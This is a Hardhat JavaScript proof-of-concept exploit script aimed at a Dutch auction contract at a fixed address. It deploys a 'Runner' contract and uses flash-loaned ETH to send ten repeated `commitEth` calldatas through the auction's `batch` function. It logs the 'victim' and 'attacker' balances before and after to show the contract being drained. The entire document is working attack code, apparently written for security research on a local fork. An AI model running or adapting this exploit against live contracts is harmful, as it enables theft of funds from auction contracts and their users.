const { ethers } = require("hardhat");
const DutchAuction_ABI = require('../abis/DutchAuction.json');

async function main() {

  const DUTCH_AUCTION_CONTRACT_ADDRESS = '0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e';

  const [ attacker ] = await ethers.getSigners();

  // Set attacker's ETH balance to 3 ETH
  await ethers.provider.send("hardhat_setBalance", [
    attacker.address,
    "0x29a2241af62c0000", // 3 ETH
  ]);

  const targetContract = new ethers.Contract(DUTCH_AUCTION_CONTRACT_ADDRESS, DutchAuction_ABI, attacker);

  console.log(`Initial victim ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(targetContract.address))
  } ETH`);
  console.log(`Initial attacker ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
  } ETH`);

  const runnerContract = await (await ethers.getContractFactory("Runner", attacker)).deploy();

  // This is just a rough estimation of how much ETH the call to the `batch` function needs.
  // It leaves some dust ETH in the target contract.
  // Also note that this amount of ETH is flash-loaned.
  let amountInWei = ethers.utils.parseEther('12518.76');
  let numberOfCalls = 10;

  console.log('Running test case');

  await runnerContract.run(
    targetContract.address,
    amountInWei, 
    Array(numberOfCalls).fill( // the array of calldatas to send to the `batch` function
      targetContract.interface.encodeFunctionData("commitEth", [runnerContract.address, true])
    )
  );
  
  console.log(`Final victim ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(targetContract.address))
  } ETH`);

  console.log(`Final attacker ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
  } ETH`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
